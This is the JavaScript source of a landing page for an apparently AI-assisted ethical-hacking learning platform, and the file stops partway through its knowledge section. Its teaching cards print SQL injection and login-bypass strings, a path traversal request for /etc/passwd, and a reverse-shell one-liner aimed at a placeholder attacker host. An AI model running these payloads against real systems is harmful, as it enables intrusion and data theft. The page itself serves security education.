// Copyright (c) 2026 SpartanKing18. All rights reserved.
// Source-available for learning only. Redistribution prohibited. See LICENSE.
(function(){var _h=location.hostname,_a=["darknode.ai","www.darknode.ai","localhost","127.0.0.1"];if(!_a.some(function(d){return _h===d}))throw document.body.innerHTML="",new Error("unlicensed")}());

import { db } from "/js/firebase.js";
import { collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.17.0/firebase-firestore.js";

const GITHUB = "https://github.com/SpartanKing18";

export function renderLanding(view, actions) {
  view.innerHTML = `

    <!-- ====== HERO ====== -->
    <section class="hero" aria-label="Hero">
      <div class="hero-mesh"></div>
      <div class="hero-grain"></div>
      <div class="wrap hero-inner">
        <div class="hero-badge"><span class="badge-dot"></span> Source available &middot; Free forever</div>
        <h1 class="hero-h1">The AI-powered platform<br>for <span class="hero-rotate-wrap"><span class="hero-rotate" id="hero-rotate">cybersecurity</span></span></h1>
        <p class="hero-sub">Tools, labs, and an AI agent to learn ethical hacking — running entirely on your machine. No cloud. No subscriptions. No data leaves your computer.</p>
        <div class="hero-cta">
          <button class="btn lg glow" id="cta-start">Get started &mdash; free</button>
          <a class="btn lg ghost" href="${GITHUB}/darknode-cli" target="_blank" rel="noopener">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" style="margin-right:8px"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.3 3.44 9.8 8.2 11.39.6.11.82-.26.82-.58v-2.23c-3.34.73-4.04-1.42-4.04-1.42-.55-1.39-1.34-1.76-1.34-1.76-1.08-.74.08-.73.08-.73 1.2.08 1.84 1.23 1.84 1.23 1.07 1.83 2.81 1.3 3.5 1 .1-.78.42-1.3.76-1.6-2.67-.3-5.47-1.33-5.47-5.93 0-1.31.47-2.38 1.24-3.22-.14-.3-.54-1.52.1-3.18 0 0 1-.32 3.3 1.23a11.5 11.5 0 016.02 0c2.28-1.55 3.29-1.23 3.29-1.23.64 1.66.24 2.88.12 3.18.77.84 1.23 1.91 1.23 3.22 0 4.61-2.8 5.63-5.48 5.92.42.37.81 1.1.81 2.22v3.29c0 .32.22.7.82.58A12.01 12.01 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
            Star on GitHub
          </a>
        </div>
        <div class="hero-trust">
          <div class="trust-item"><span class="trust-n" data-count="200000" data-suffix="+" data-format="comma">0</span><span class="trust-l">Lines of code</span></div>
          <div class="trust-sep"></div>
          <div class="trust-item"><span class="trust-n" data-count="192" data-suffix="+">0</span><span class="trust-l">Security tools</span></div>
          <div class="trust-sep"></div>
          <div class="trust-item"><span class="trust-n" data-count="59">0</span><span class="trust-l">AI modules</span></div>
          <div class="trust-sep"></div>
          <div class="trust-item"><span class="trust-n" data-count="8">0</span><span class="trust-l">AI engines</span></div>
          <div class="trust-sep"></div>
          <div class="trust-item"><span class="trust-n trust-n-static">100%</span><span class="trust-l">Local &amp; private</span></div>
        </div>
        <div class="hero-built-with">
          <span class="built-label">Built with</span>
          <div class="built-pills">
            <span class="built-pill">Node.js</span>
            <span class="built-pill">Python</span>
            <span class="built-pill">Ollama</span>
            <span class="built-pill">Claude</span>
            <span class="built-pill">Firebase</span>
            <span class="built-pill">Linux</span>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== PRODUCT BENTO ====== -->
    <section class="section" id="products" aria-labelledby="products-title">
      <div class="wrap">
        <div class="sec-label">Products</div>
        <h2 class="sec-title" id="products-title">Three ways to use Darknode</h2>
        <p class="sec-sub">Choose what fits. All free. All run on your machine.</p>
        <div class="bento">
          <div class="bento-card bento-lg">
            <div class="bento-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="3"/><path d="M7 8h10M7 12h6M7 16h8"/></svg>
            </div>
            <h3>Web App</h3>
            <p>Open darknode.ai in your browser. Tools, cheat sheets, CVE lookup, practice labs, and the learning hub — zero install.</p>
            <span class="bento-tag">No install needed</span>
          </div>
          <div class="bento-card">
            <div class="bento-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
            </div>
            <h3>CLI</h3>
            <p>One command: <code>npm i -g darknode-cli</code>. 192+ tools, AI agent, and the Nexus engine in your terminal.</p>
            <span class="bento-tag">npm install</span>
          </div>
          <div class="bento-card">
            <div class="bento-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M2 8h20"/><circle cx="5" cy="6" r=".5" fill="currentColor"/><circle cx="7.5" cy="6" r=".5" fill="currentColor"/></svg>
            </div>
            <h3>Linux VM</h3>
            <p>A full security workstation. Like Kali, but with Darknode and Nexus AI built in. Runs in VirtualBox or QEMU.</p>
            <span class="bento-tag">VirtualBox image</span>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== HOW IT WORKS (4-step timeline) ====== -->
    <section class="section alt" id="how" aria-labelledby="how-title">
      <div class="wrap">
        <div class="sec-label">How it works</div>
        <h2 class="sec-title" id="how-title">Up and running in four steps</h2>
        <p class="sec-sub">From install to your first scan in under five minutes.</p>
        <div class="timeline-v">

          <div class="tlv-step">
            <div class="tlv-num">1</div>
            <div class="tlv-body">
              <div class="tlv-text">
                <h3>Install in one command</h3>
                <p><code>npm i -g darknode-cli</code> or download the desktop app. Works on Linux, macOS, and Windows.</p>
              </div>
              <div class="tlv-visual">
                <div class="term-window demo-term">
                  <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">terminal</span></div>
                  <pre class="tw-body"><span class="c-pl">$</span> npm i -g darknode-cli\n<span class="c-mut">+ darknode-cli@2.14.0</span>\n<span class="c-mut">added 1 package in 3.2s</span>\n\n<span class="c-pl">$</span> darknode --version\n<span class="c-ok">darknode v2.14.0</span></pre>
                </div>
              </div>
            </div>
          </div>

          <div class="tlv-step">
            <div class="tlv-num">2</div>
            <div class="tlv-body">
              <div class="tlv-text">
                <h3>Launch Nexus AI</h3>
                <p>Run <code>darknode</code> in your terminal. The AI agent starts with GPT-OSS 120B -- free, private, no API key needed.</p>
              </div>
              <div class="tlv-visual">
                <div class="term-window demo-term">
                  <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">darknode</span></div>
                  <pre class="tw-body"><span class="c-pl">$</span> darknode\n\n  <span class="c-acc">Darknode Nexus v2.14</span>\n  Engine: <span class="c-ok">GPT-OSS 120B</span> (local)\n  Status: <span class="c-ok">Ready</span>\n\n<span class="c-acc">nexus&gt;</span> <span class="tw-cursor">_</span></pre>
                </div>
              </div>
            </div>
          </div>

          <div class="tlv-step">
            <div class="tlv-num">3</div>
            <div class="tlv-body">
              <div class="tlv-text">
                <h3>Ask it anything</h3>
                <p>Describe what you want to do in plain English. Nexus reads your code, runs scans, writes scripts, and explains every step.</p>
              </div>
              <div class="tlv-visual">
                <div class="term-window demo-term">
                  <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">nexus</span></div>
                  <pre class="tw-body"><span class="c-acc">nexus&gt;</span> scan 10.10.14.7 and explain\n        what you find\n\n<span class="c-acc">Nexus:</span> Running nmap on target...\n\n<span class="c-ok">22</span>  ssh    OpenSSH 9.6\n<span class="c-ok">80</span>  http   nginx 1.24\n<span class="c-ok">443</span> https\n\nPort 22: check <span class="c-bad">CVE-2024-6387</span>...</pre>
                </div>
              </div>
            </div>
          </div>

          <div class="tlv-step">
            <div class="tlv-num">4</div>
            <div class="tlv-body">
              <div class="tlv-text">
                <h3>Learn by doing</h3>
                <p>Practice on local labs, study the AI's methodology, and build real security skills. Everything runs on your machine.</p>
              </div>
              <div class="tlv-visual">
                <div class="term-window demo-term">
                  <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">darknode</span></div>
                  <pre class="tw-body"><span class="c-pl">$</span> darknode lab start dvwa\n<span class="c-ok">[+]</span> DVWA running on localhost:8080\n\n<span class="c-acc">nexus&gt;</span> walk me through SQL injection\n\n<span class="c-acc">Nexus:</span> Open localhost:8080/login.\nTry entering <span class="c-bad">' OR 1=1--</span> in the\nusername field...</pre>
                </div>
              </div>
            </div>
          </div>

        </div>
      </div>
    </section>

    <!-- ====== FEATURES ====== -->
    <section class="section alt" id="features" aria-labelledby="features-title">
      <div class="wrap">
        <div class="sec-label">Capabilities</div>
        <h2 class="sec-title" id="features-title">Everything you need to learn security</h2>
        <div class="feature-rows">
          <div class="feature-row">
            <div class="feature-text">
              <h3>192+ security tools, one command away</h3>
              <p>Nmap, SQLMap, Hydra, Nuclei, Gobuster, Metasploit — pre-configured with copy-paste install commands. Search, filter, and launch from the web or CLI.</p>
            </div>
            <div class="feature-visual">
              <div class="term-window">
                <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">darknode</span></div>
                <pre class="tw-body"><span class="c-pl">$</span> darknode scan 10.10.14.7\n<span class="c-ok">22</span>  ssh    OpenSSH 9.6\n<span class="c-ok">80</span>  http   nginx 1.24\n<span class="c-ok">443</span> https\n<span class="c-acc">[+]</span> 3 open ports</pre>
              </div>
            </div>
          </div>
          <div class="feature-row reverse">
            <div class="feature-text">
              <h3>AI that runs on your machine</h3>
              <p>Nexus is a 59-module AI agent engine. It reads your code, runs commands, explains vulnerabilities, and writes scripts. Use free local models or bring your own API key. We never see your data.</p>
            </div>
            <div class="feature-visual">
              <div class="term-window">
                <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">nexus</span></div>
                <pre class="tw-body"><span class="c-pl">$</span> darknode nexus "explain CVE-2021-44228"\n\n<span class="c-acc">Nexus:</span> Log4Shell is a critical RCE\nin Apache Log4j. An attacker sends\na crafted JNDI lookup string...\n\n<span class="c-mut">engine: ollama (local, free)</span></pre>
              </div>
            </div>
          </div>
          <div class="feature-row">
            <div class="feature-text">
              <h3>Practice labs you can break</h3>
              <p>Launch DVWA, Juice Shop, WebGoat, and more with one click. They run locally in Docker — legal, safe, isolated. Break them, learn from them, reset them.</p>
            </div>
            <div class="feature-visual">
              <div class="lab-grid">
                <div class="lab-card"><span class="lab-status on"></span>DVWA<span class="lab-port">:8080</span></div>
                <div class="lab-card"><span class="lab-status on"></span>Juice Shop<span class="lab-port">:3000</span></div>
                <div class="lab-card"><span class="lab-status off"></span>WebGoat<span class="lab-port">:8081</span></div>
                <div class="lab-card"><span class="lab-status off"></span>Metasploitable<span class="lab-port">:—</span></div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== BY THE NUMBERS ====== -->
    <section class="section" id="metrics" aria-labelledby="metrics-title">
      <div class="wrap">
        <div class="sec-label">By the numbers</div>
        <h2 class="sec-title" id="metrics-title">Built to be massive</h2>
        <p class="sec-sub">Every number earned, not inflated. This is what a one-person army looks like.</p>
        <div class="metrics-grid">
          <div class="metric-card"><span class="metric-n" data-count="200000" data-suffix="+" data-format="comma">0</span><span class="metric-l">Lines of code</span></div>
          <div class="metric-card"><span class="metric-n" data-count="192" data-suffix="+">0</span><span class="metric-l">Security tools</span></div>
          <div class="metric-card"><span class="metric-n" data-count="59">0</span><span class="metric-l">AI modules</span></div>
          <div class="metric-card"><span class="metric-n" data-count="8">0</span><span class="metric-l">AI engine integrations</span></div>
          <div class="metric-card"><span class="metric-n" data-count="50" data-suffix="+">0</span><span class="metric-l">Slash commands</span></div>
          <div class="metric-card"><span class="metric-n" data-count="30" data-suffix="+">0</span><span class="metric-l">Cheat sheets</span></div>
          <div class="metric-card"><span class="metric-n" data-count="502" data-suffix="+">0</span><span class="metric-l">Payloads</span></div>
          <div class="metric-card"><span class="metric-n metric-n-static">100%</span><span class="metric-l">Local &amp; private</span></div>
        </div>
      </div>
    </section>

    <!-- ====== COMPARISON TABLE ====== -->
    <section class="section" id="compare" aria-labelledby="compare-title">
      <div class="wrap">
        <div class="sec-label">How we compare</div>
        <h2 class="sec-title" id="compare-title">Darknode vs. the alternatives</h2>
        <p class="sec-sub">One platform. Zero compromises.</p>
        <div class="cmp-scroll">
          <table class="cmp-landing" aria-label="Feature comparison between Darknode and alternatives">
            <thead>
              <tr>
                <th class="cmp-feature-col">Feature</th>
                <th class="cmp-dn-col">Darknode</th>
                <th>Kali Linux</th>
                <th>HackTheBox</th>
                <th>TryHackMe</th>
                <th>Burp Suite</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>Price</td>
                <td class="cmp-dn"><span class="cmp-highlight">Free forever</span></td>
                <td>Free</td>
                <td>$49/mo</td>
                <td>$14/mo</td>
                <td>$449/yr</td>
              </tr>
              <tr>
                <td>AI Agent</td>
                <td class="cmp-dn"><span class="cmp-check">&check;</span> 59 modules</td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
              </tr>
              <tr>
                <td>Local / Private</td>
                <td class="cmp-dn"><span class="cmp-check">&check;</span> 100%</td>
                <td><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td>Local</td>
              </tr>
              <tr>
                <td>Tools included</td>
                <td class="cmp-dn"><span class="cmp-check">&check;</span> 80+</td>
                <td>600+</td>
                <td>Limited</td>
                <td>Limited</td>
                <td>1</td>
              </tr>
              <tr>
                <td>Practice labs</td>
                <td class="cmp-dn"><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
              </tr>
              <tr>
                <td>Code analysis</td>
                <td class="cmp-dn"><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-check">&check;</span></td>
              </tr>
              <tr>
                <td>Custom reports</td>
                <td class="cmp-dn"><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-check">&check;</span></td>
              </tr>
              <tr>
                <td>Runs offline</td>
                <td class="cmp-dn"><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-check">&check;</span></td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    </section>

    <!-- ====== TOOL SHOWCASE ====== -->
    <section class="section" id="tools-showcase" aria-labelledby="tools-title">
      <div class="wrap">
        <div class="sec-label">Arsenal</div>
        <h2 class="sec-title" id="tools-title">192+ security tools, zero configuration</h2>
        <p class="sec-sub">From reconnaissance to exploitation to post-exploitation. Pre-configured, documented, and ready to run.</p>
        <div class="ts-tabs" role="tablist" aria-label="Tool categories">
          <button class="ts-tab on" data-cat="all" role="tab" aria-selected="true">All</button>
          <button class="ts-tab" data-cat="recon" role="tab" aria-selected="false">Recon</button>
          <button class="ts-tab" data-cat="exploitation" role="tab" aria-selected="false">Exploitation</button>
          <button class="ts-tab" data-cat="web" role="tab" aria-selected="false">Web</button>
          <button class="ts-tab" data-cat="network" role="tab" aria-selected="false">Network</button>
          <button class="ts-tab" data-cat="forensics" role="tab" aria-selected="false">Forensics</button>
          <button class="ts-tab" data-cat="passwords" role="tab" aria-selected="false">Passwords</button>
          <button class="ts-tab" data-cat="wireless" role="tab" aria-selected="false">Wireless</button>
        </div>
        <div class="ts-grid" id="ts-grid">
          <div class="ts-card" data-cat="network">
            <div class="ts-name">Nmap</div>
            <div class="ts-desc">Network discovery and security auditing scanner</div>
            <div class="ts-meta"><span class="ts-badge cat-network">Network</span><span class="ts-mode">CLI</span></div>
          </div>
          <div class="ts-card" data-cat="web">
            <div class="ts-name">SQLMap</div>
            <div class="ts-desc">Automatic SQL injection and database takeover</div>
            <div class="ts-meta"><span class="ts-badge cat-web">Web</span><span class="ts-mode mode-browser">In-browser</span></div>
          </div>
          <div class="ts-card" data-cat="passwords">
            <div class="ts-name">Hydra</div>
            <div class="ts-desc">Fast network login cracker supporting 50+ protocols</div>
            <div class="ts-meta"><span class="ts-badge cat-passwords">Passwords</span><span class="ts-mode">CLI</span></div>
          </div>
          <div class="ts-card" data-cat="web">
            <div class="ts-name">Gobuster</div>
            <div class="ts-desc">Directory and DNS brute-force enumeration</div>
            <div class="ts-meta"><span class="ts-badge cat-web">Web</span><span class="ts-mode mode-browser">In-browser</span></div>
          </div>
          <div class="ts-card" data-cat="recon">
            <div class="ts-name">Nuclei</div>
            <div class="ts-desc">Template-based vulnerability scanner with 8,000+ checks</div>
            <div class="ts-meta"><span class="ts-badge cat-recon">Recon</span><span class="ts-mode">CLI</span></div>
          </div>
          <div class="ts-card" data-cat="exploitation">
            <div class="ts-name">Metasploit</div>
            <div class="ts-desc">Penetration testing framework with 2,000+ exploits</div>
            <div class="ts-meta"><span class="ts-badge cat-exploitation">Exploitation</span><span class="ts-mode">CLI</span></div>
          </div>
          <div class="ts-card" data-cat="web">
            <div class="ts-name">Nikto</div>
            <div class="ts-desc">Web server scanner for dangerous files and outdated software</div>
            <div class="ts-meta"><span class="ts-badge cat-web">Web</span><span class="ts-mode mode-browser">In-browser</span></div>
          </div>
          <div class="ts-card" data-cat="web">
            <div class="ts-name">WPScan</div>
            <div class="ts-desc">WordPress vulnerability scanner and enumeration tool</div>
            <div class="ts-meta"><span class="ts-badge cat-web">Web</span><span class="ts-mode">CLI</span></div>
          </div>
          <div class="ts-card" data-cat="passwords">
            <div class="ts-name">John the Ripper</div>
            <div class="ts-desc">Password hash cracker with auto-detect and wordlists</div>
            <div class="ts-meta"><span class="ts-badge cat-passwords">Passwords</span><span class="ts-mode">CLI</span></div>
          </div>
          <div class="ts-card" data-cat="passwords">
            <div class="ts-name">Hashcat</div>
            <div class="ts-desc">GPU-accelerated password recovery supporting 300+ hash types</div>
            <div class="ts-meta"><span class="ts-badge cat-passwords">Passwords</span><span class="ts-mode">CLI</span></div>
          </div>
          <div class="ts-card" data-cat="forensics">
            <div class="ts-name">Wireshark</div>
            <div class="ts-desc">Network protocol analyzer and packet capture tool</div>
            <div class="ts-meta"><span class="ts-badge cat-forensics">Forensics</span><span class="ts-mode">CLI</span></div>
          </div>
          <div class="ts-card" data-cat="wireless">
            <div class="ts-name">Aircrack-ng</div>
            <div class="ts-desc">WiFi network security assessment and key cracking suite</div>
            <div class="ts-meta"><span class="ts-badge cat-wireless">Wireless</span><span class="ts-mode">CLI</span></div>
          </div>
          <div class="ts-card" data-cat="web">
            <div class="ts-name">Dirb</div>
            <div class="ts-desc">Web content scanner using dictionary-based attacks</div>
            <div class="ts-meta"><span class="ts-badge cat-web">Web</span><span class="ts-mode mode-browser">In-browser</span></div>
          </div>
          <div class="ts-card" data-cat="recon">
            <div class="ts-name">Enum4linux</div>
            <div class="ts-desc">SMB share and user enumeration for Windows targets</div>
            <div class="ts-meta"><span class="ts-badge cat-recon">Recon</span><span class="ts-mode">CLI</span></div>
          </div>
          <div class="ts-card" data-cat="exploitation">
            <div class="ts-name">LinPEAS</div>
            <div class="ts-desc">Linux privilege escalation audit and enumeration script</div>
            <div class="ts-meta"><span class="ts-badge cat-exploitation">Exploitation</span><span class="ts-mode">CLI</span></div>
          </div>
          <div class="ts-card" data-cat="web">
            <div class="ts-name">ZAP Proxy</div>
            <div class="ts-desc">Open-source web application security testing proxy</div>
            <div class="ts-meta"><span class="ts-badge cat-web">Web</span><span class="ts-mode mode-browser">In-browser</span></div>
          </div>
        </div>
        <div style="text-align:center;margin-top:32px">
          <a class="btn lg ghost" href="#" id="ts-view-all">View all 192+ tools &rarr;</a>
        </div>
      </div>
    </section>

    <!-- ====== NEXUS ENGINE ====== -->
    <section class="section nx-section" id="nexus" aria-labelledby="nexus-title">
      <div class="nx-section-glow"></div>
      <div class="wrap">
        <div class="sec-label">AI Engine</div>
        <h2 class="sec-title" id="nexus-title">Nexus -- the engine under the hood</h2>
        <p class="sec-sub">Not a wrapper around ChatGPT. A full agentic platform with planning, multi-agent orchestration, self-evaluation, and 8 AI backends. Every layer built from scratch.</p>

        <!-- Architecture diagram -->
        <div class="nx-arch" aria-label="Nexus architecture diagram">
          <div class="nx-arch-layer nx-arch-l1">
            <div class="nx-arch-header">
              <span class="nx-arch-label">8 AI Engines</span>
              <span class="nx-arch-tag">Layer 1</span>
            </div>
            <div class="nx-arch-pills">
              <span class="nx-arch-pill">Claude</span>
              <span class="nx-arch-pill">Gemini</span>
              <span class="nx-arch-pill">Codex</span>
              <span class="nx-arch-pill">OpenCode</span>
              <span class="nx-arch-pill">Aider</span>
              <span class="nx-arch-pill">Ollama</span>
              <span class="nx-arch-pill">GPT-OSS</span>
              <span class="nx-arch-pill">API</span>
            </div>
          </div>
          <div class="nx-arch-connector"></div>
          <div class="nx-arch-layer nx-arch-l2">
            <div class="nx-arch-header">
              <span class="nx-arch-label">Planning &amp; Orchestration</span>
              <span class="nx-arch-tag">Layer 2</span>
            </div>
            <div class="nx-arch-pills">
              <span class="nx-arch-pill">Agentic Planner</span>
              <span class="nx-arch-pill">Multi-Agent</span>
              <span class="nx-arch-pill">Pipelines</span>
              <span class="nx-arch-pill">Skill Forge</span>
              <span class="nx-arch-pill">World Model</span>
              <span class="nx-arch-pill">Codemod</span>
              <span class="nx-arch-pill">Sandbox</span>
            </div>
          </div>
          <div class="nx-arch-connector"></div>
          <div class="nx-arch-layer nx-arch-l3">
            <div class="nx-arch-header">
              <span class="nx-arch-label">Memory &amp; Context</span>
              <span class="nx-arch-tag">Layer 3</span>
            </div>
            <div class="nx-arch-pills">
              <span class="nx-arch-pill">Deep Memory (3-tier)</span>
              <span class="nx-arch-pill">Sessions</span>
              <span class="nx-arch-pill">Context Engine</span>
              <span class="nx-arch-pill">Thought Stream</span>
              <span class="nx-arch-pill">Time Travel</span>
            </div>
          </div>
          <div class="nx-arch-connector"></div>
          <div class="nx-arch-layer nx-arch-l4">
            <div class="nx-arch-header">
              <span class="nx-arch-label">Verification</span>
              <span class="nx-arch-tag">Layer 4</span>
            </div>
            <div class="nx-arch-pills">
              <span class="nx-arch-pill">Verification Engine</span>
              <span class="nx-arch-pill">Self-Evaluation</span>
              <span class="nx-arch-pill">Ghost Agents</span>
              <span class="nx-arch-pill">Code Review</span>
              <span class="nx-arch-pill">Code Radar</span>
              <span class="nx-arch-pill">Smart Tests</span>
              <span class="nx-arch-pill">Error Recovery</span>
            </div>
          </div>
          <div class="nx-arch-connector"></div>
          <div class="nx-arch-layer nx-arch-l5">
            <div class="nx-arch-footer-band">59 modules &mdash; 200,000+ lines of code</div>
          </div>
        </div>

        <!-- Feature highlights -->
        <div class="nx-highlights">
          <div class="nx-hl">
            <div class="nx-hl-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v3m0 12v3M3 12h3m12 0h3m-3.5-6.5L16 7m-8 10l-2.5 2.5M20.5 18.5L18 16M5.5 7L3.5 5.5"/><circle cx="12" cy="12" r="4"/></svg>
            </div>
            <h3>Multi-engine</h3>
            <p>Switch between 8 AI providers, race them against each other, or ensemble their answers for higher accuracy.</p>
          </div>
          <div class="nx-hl">
            <div class="nx-hl-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 3H5a2 2 0 00-2 2v4m6-6h10a2 2 0 012 2v4M9 3v18m0 0H5a2 2 0 01-2-2v-4m6 6h10a2 2 0 002-2v-4"/><path d="M14 9l-1 2 3 2-1 2"/></svg>
            </div>
            <h3>Autonomous</h3>
            <p>Give it a goal -- it plans, executes, and verifies with zero babysitting. Ghost Agents run tasks in the background.</p>
          </div>
          <div class="nx-hl">
            <div class="nx-hl-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/><circle cx="12" cy="16" r="1"/></svg>
            </div>
            <h3>Private</h3>
            <p>Runs 100% locally with Ollama. Your code never leaves your machine. No telemetry, no cloud, no data collection.</p>
          </div>
        </div>

        <!-- Collapsible module list -->
        <details class="nx-details">
          <summary>See all 59 modules &darr;</summary>
          <div class="nx-modules">
            <div class="nx-group">
              <h4>Intelligence</h4>
              <span>Intent Router</span><span>Reasoning Engine</span><span>Prompt Engine</span><span>Metacognition</span><span>Knowledge Graph</span><span>Workspace Intel</span><span>Adaptive Learner</span>
            </div>
            <div class="nx-group">
              <h4>Execution</h4>
              <span>Agentic Planner</span><span>Multi-Agent</span><span>Pipelines</span><span>Skill Forge</span><span>World Model</span><span>Codemod</span><span>Sandbox</span><span>NXP Protocol</span>
            </div>
            <div class="nx-group">
              <h4>Memory</h4>
              <span>Deep Memory (3-tier)</span><span>Sessions</span><span>Context Engine</span><span>Thought Stream</span><span>Time Travel</span>
            </div>
            <div class="nx-group">
              <h4>Quality</h4>
              <span>Verification Engine</span><span>Self-Evaluation</span><span>Ghost Agents</span><span>Code Review</span><span>Code Radar</span><span>Smart Tests</span><span>Error Recovery</span>
            </div>
            <div class="nx-group">
              <h4>Infrastructure</h4>
              <span>MCP Bridge</span><span>3D Modeler</span><span>Telemetry</span><span>Plugins</span><span>Git Intelligence</span><span>8 AI Engines</span>
            </div>
          </div>
        </details>
      </div>
    </section>

    <!-- ====== SECURITY KNOWLEDGE ====== -->
    <section class="section alt" id="security-knowledge" aria-labelledby="rag-title">
      <div class="wrap">
        <div class="sec-label">Security RAG</div>
        <h2 class="sec-title" id="rag-title">Built-in security knowledge</h2>
        <p class="sec-sub">Not a generic chatbot. Nexus ships with a deep, structured knowledge base covering real-world attack techniques, OWASP standards, and offensive tooling.</p>
        <div class="rag-tabs" role="tablist" aria-label="Knowledge categories">
          <button class="rag-tab active" role="tab" aria-selected="true" data-rag="owasp">OWASP Top 10</button>
          <button class="rag-tab" role="tab" aria-selected="false" data-rag="attacks">Attack Patterns</button>
          <button class="rag-tab" role="tab" aria-selected="false" data-rag="tools">Tools &amp; Commands</button>
          <button class="rag-tab" role="tab" aria-selected="false" data-rag="privesc">Privilege Escalation</button>
          <button class="rag-tab" role="tab" aria-selected="false" data-rag="recon">Network Recon</button>
        </div>

        <div class="rag-panel active" data-rag-panel="owasp">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>Broken Access Control</h4>
                <span class="sev critical">Critical</span>
              </div>
              <p>Insecure direct object references (IDOR), missing function-level authorization checks, and path traversal. Attackers modify identifiers to access other users' data.</p>
              <div class="rag-code"><code>GET /api/user/124  -->  GET /api/user/125</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>Injection</h4>
                <span class="sev critical">Critical</span>
              </div>
              <p>SQL injection, command injection, and cross-site scripting. Unsanitized user input is interpreted as code by the backend or database engine.</p>
              <div class="rag-code"><code>' OR 1=1 --</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>Security Misconfiguration</h4>
                <span class="sev high">High</span>
              </div>
              <p>Default credentials left in production, debug mode enabled, missing security headers, unnecessary services exposed. The most common class of real-world findings.</p>
              <div class="rag-code"><code>X-Powered-By: Express\nServer: Apache/2.4.49</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>Cryptographic Failures</h4>
                <span class="sev high">High</span>
              </div>
              <p>Weak or missing encryption for data in transit and at rest. Deprecated algorithms, hardcoded secrets, and exposed sensitive data in logs or error messages.</p>
              <div class="rag-code"><code>Set-Cookie: session=abc123  (missing Secure; HttpOnly)</code></div>
            </div>
          </div>
        </div>

        <div class="rag-panel" data-rag-panel="attacks">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>Authentication Bypass</h4>
                <span class="sev critical">Critical</span>
              </div>
              <p>SQL injection in login forms, default credentials, JWT manipulation, and comment-based truncation. Bypasses authentication entirely without valid credentials.</p>
              <div class="rag-code"><code>admin' --\n' OR 1=1 --\n' UNION SELECT null,null --</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>Reverse Shell</h4>
                <span class="sev critical">Critical</span>
              </div>
              <p>Post-exploitation technique establishing an outbound connection from the target back to the attacker's listener, granting interactive shell access.</p>
              <div class="rag-code"><code>bash -i >& /dev/tcp/ATTACKER/4444 0>&1</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>Directory Traversal</h4>
                <span class="sev high">High</span>
              </div>
              <p>Path manipulation to escape the web root and read arbitrary files on the server. Targets configuration files, credentials, and system internals.</p>
              <div class="rag-code"><code>GET /download?file=../../../etc/passwd</code></div>
            </div>
          </div>
        </div>

        <div class="rag-panel" data-rag-panel="tools">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>Nmap Service Scan</h4>
                <span class="sev medium">Medium</span>
              </div>
              <p>Network mapper with version detection. Identifies open ports, running services, and OS fingerprints. The first step in any engagement's reconnaissance phase.</p>
              <div class="rag-code"><code>nmap -sV -sC -O -p- 10.10.14.7</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>SQLMap Automated Injection</h4>
